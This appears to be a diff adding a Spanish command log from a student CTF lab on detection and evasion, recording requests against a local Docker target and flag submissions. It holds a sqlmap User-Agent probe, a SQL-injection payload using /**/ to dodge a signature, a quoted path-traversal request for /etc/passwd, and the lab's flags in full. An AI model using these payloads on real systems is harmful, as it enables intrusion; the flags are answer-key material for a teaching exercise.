@@ -1,0 +1,133 @@
+# Bitacora de comandos y cronologia de requests propios contra phantomcorp.
+# Entorno: Lab 10 levantado con Docker; comandos ejecutados desde la consola
+# atacante (cyberlab-attacker) salvo que se indique lo contrario.
+#
+# Regla del grupo: cada responsable anota su request ANTES de ejecutarlo,
+# para poder distinguir el trafico propio de la intrusion real de R5.
+
+# --- P1 — R1: vista inicial del SOC (linea base, antes de cualquier prueba) ---
+# [2026-10-23] Consulta de linea base, antes de generar trafico de prueba:
+curl -sS http://phantomcorp/soc
+# Salida completa, sin editar, en evidencia/salidas/r1-soc-inicial.txt
+# (120 lineas de trafico + la flag de acceso al SOC en el banner)
+
+# Presentacion de la flag, ejecutada desde la raiz del repositorio:
+./ctf submit 10 R1 'FLAG{...}'
+
+# --- P2 — R2: detección controlada por User-Agent ---
+# Ejecutado desde cyberlab-attacker contra el único objetivo autorizado.
+curl -sS -i -A sqlmap http://phantomcorp/
+# Respuesta 403 y alerta en evidencia/salidas/r2-scanner-ua.txt.
+
+# Flag registrada mediante una copia temporal normalizada a LF: se convirtieron
+# ctf, bibliotecas .sh y retos.manifest; solo se persistió .progreso/10.done.
+./ctf submit 10 R2 'FLAG{detection_triggered}'
+
+# --- R3 (pendiente): consulta a /soc/reglas ---
+# --- R4 (pendiente): evasion controlada de sqli-union ---
+# --- R5 (pendiente): correlacion final sobre el log completo del SOC ---
+
+# --- P3 — R3: ruleset publicado (2026-10-23) ---
+# Desde PowerShell: docker exec cyberlab-attacker bash -c '<comando>'
+# Misma consola atacante utilizada por make shell, en modo no interactivo.
+# Consulta única, salida cruda redirigida en el host:
+curl -sS http://phantomcorp/soc/reglas > evidencia/salidas/r3-ruleset.txt
+# Corrección: la primera salida fue Not Found; se conservó como r3-intento-target-lab09.txt.
+# Diagnóstico en host: docker inspect confirmó compose de Lab 09.
+# También se consultó curl -sS -i http://phantomcorp/ desde atacante: banner PhantomCapstone/1.0.
+# Se activa únicamente el target del Lab 10 (equivalente a make lab N=10):
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab10-deteccion-evasion/entorno/target.compose.yml up -d --build phantomcorp
+# Consulta R3 al target Lab 10, desde cyberlab-attacker:
+curl -sS http://phantomcorp/soc/reglas > evidencia/salidas/r3-ruleset.txt
+# Envío R3 con el verificador oficial en copia temporal LF (originales intactos).
+# Se copian ctf, bin/lib, manifest opaco y progreso a /tmp/lab10-p3; sed elimina CR.
+# Desde la raíz temporal: ./ctf submit 10 R3 'FLAG{signature_ruleset}'
+# Luego ./ctf status 10; se copia únicamente 10.done a .progreso local.
+
+# Verificación local: se envió un script Python por stdin a docker exec -i cyberlab-attacker python3 -.
+# Ocho casos de regex, sin solicitudes HTTP; salida en salidas/p3-regresion-regla.txt.
+# Casos: espacio, comentario vacío, comentario multilínea, tabulación, palabras pegadas,
+# prefijo reunion, comentario sin cierre y texto documental (posible falso positivo).
+
+# --- P5 — R5: correlación de la intrusión ---
+# Fecha: 2026-10-26
+# Entorno autorizado: Lab 10, Grupo 06.
+
+# 1. Análisis de la línea base del SOC guardada por P1.
+# Ejecutado desde PowerShell; no genera tráfico HTTP nuevo.
+Get-Content entregas/lab10/grupo06/evidencia/salidas/r1-soc-inicial.txt -Head 20
+Get-Content entregas/lab10/grupo06/evidencia/salidas/r1-soc-inicial.txt -Tail 25
+
+# 2. Buscar las alertas del SOC.
+Select-String -Path entregas/lab10/grupo06/evidencia/salidas/r1-soc-inicial.txt -Pattern "ALERT"
+
+# 3. Conservar una copia de la línea base completa.
+Copy-Item entregas/lab10/grupo06/evidencia/salidas/r1-soc-inicial.txt entregas/lab10/grupo06/evidencia/salidas/r5-soc-completo.txt
+
+# 4. Extraer el evento relevante.
+Select-String -Path entregas/lab10/grupo06/evidencia/salidas/r1-soc-inicial.txt -Pattern "ALERT\[path-traversal\]" | ForEach-Object { $_.Line } | Set-Content entregas/lab10/grupo06/evidencia/salidas/r5-correlacion-log.txt -Encoding UTF8
+
+# Hallazgo observado:
+# Origen: 185.220.101.42
+# Método y ruta: GET /admin/../../etc/passwd
+# Respuesta: HTTP 200
+# Alerta: ALERT[path-traversal]
+# Flag: FLAG{intrusion_in_the_noise}
+
+# 5. Validación desde PowerShell mediante copia temporal compatible con Linux.
+docker exec cyberlab-attacker bash /tmp/lab10-p5/ctf submit 10 R5 'FLAG{intrusion_in_the_noise}'
+docker exec cyberlab-attacker bash /tmp/lab10-p5/ctf status 10
+
+# Resultado: R5 aceptado.
+# El estado temporal de 1/5 no representa el progreso consolidado del grupo.
+
+# --- P4 — R4: evasión controlada de la firma sqli-union (2026-10-28) ---
+# Al iniciar la sesión los contenedores del lab estaban detenidos (sesión
+# anterior); se levantó el target del Lab 10 desde la raíz del repo, lo que
+# reconstruyó/recreó los contenedores e inició una sesión de logs nueva:
+docker compose -p cyberlab --project-directory . -f entorno/docker-compose.yml -f labs/lab10-deteccion-evasion/entorno/target.compose.yml up -d --build
+# No se generó ningún tráfico de prueba antes de verificar el target.
+# Verificación del target, desde cyberlab-attacker (solo lectura):
+curl -sS http://phantomcorp/soc/reglas
+# Confirma: ruleset del Lab 10 y sqli-union matchea /union\s+select/ (exige ESPACIO).
+
+# Anotación previa. Request único, endpoint y ruta tomados del README del lab
+# (/api con query q); no se leyó server.py ni retos.manifest. El separador /**/
+# sustituye al espacio que la firma exige, según la propia nota del ruleset.
+# Ejecutado desde cyberlab-attacker contra phantomcorp (único objetivo autorizado):
+curl -sS -i "http://phantomcorp/api?q=1%20UNION/**/SELECT%20null,null--"
+# Respuesta cruda conservada en evidencia/salidas/r4-evasion-controlada.txt
+# ("200 OK (procesado como benigno)" + FLAG{signature_evaded}). La primera
+# captura llegó al host en UTF-16 por la redirección de PowerShell; ese archivo
+# se reescribió con el mismo contenido de texto, sin repetir ningún request.
+
+# Verificación del efecto en el SOC después de la prueba (GET de solo lectura):
+curl -sS http://phantomcorp/soc > /tmp/soc-raw.txt
+# Se transportó con docker cp a evidencia/salidas/r4-soc-despues.txt.
+# Verificado en host: las últimas 125 líneas del snapshot coinciden línea a
+# línea con la línea base de R1; no hay alertas de sqli-union, ni eventos
+# nuevos, ni rastro del request propio (la vista del log es estática).
+
+# Envío de la flag con el verificador oficial en copia temporal normalizada a LF:
+# ctf, bin/lib/*.sh y retos.manifest se normalizaron con python3 (CRLF de Windows);
+# .progreso/10.done se sembró con R1-R3 y R5, ya validados por el grupo en sus
+# sesiones y respaldados por sus evidencias, para reflejar el progreso consolidado.
+./ctf submit 10 R4 'FLAG{signature_evaded}'   # aceptada en esta sesión
+./ctf status 10                               # 5/5 consolidado
+# Salidas en evidencia/salidas/r4-submit.txt y evidencia/salidas/status-10.txt.
+# Progreso consolidado copiado al host:
+# docker cp cyberlab-attacker:/tmp/lab10-p4/.progreso/10.done .progreso/10.done
+
+# --- Revalidación final de R1–R5 desde progreso vacío (2026-10-30) ---
+# Se creó una copia temporal de ctf, bin/lib y labs/lab10-deteccion-evasion.
+# Solo en esa copia se normalizaron CRLF a LF para ctf, sus bibliotecas y
+# retos.manifest; los originales del repositorio no se editaron.
+# Desde la raíz temporal se ejecutó:
+# ./ctf submit 10 R1 soc_log_access
+# ./ctf submit 10 R2 detection_triggered
+# ./ctf submit 10 R3 signature_ruleset
+# ./ctf submit 10 R4 signature_evaded
+# ./ctf submit 10 R5 intrusion_in_the_noise
+# ./ctf status 10 > entregas/lab10/grupo06/evidencia/salidas/status-10-revalidado-lf.txt
+# Las cinco presentaciones fueron aceptadas. Luego se copió únicamente
+# .progreso/10.done al repositorio para registrar el estado 5/5.
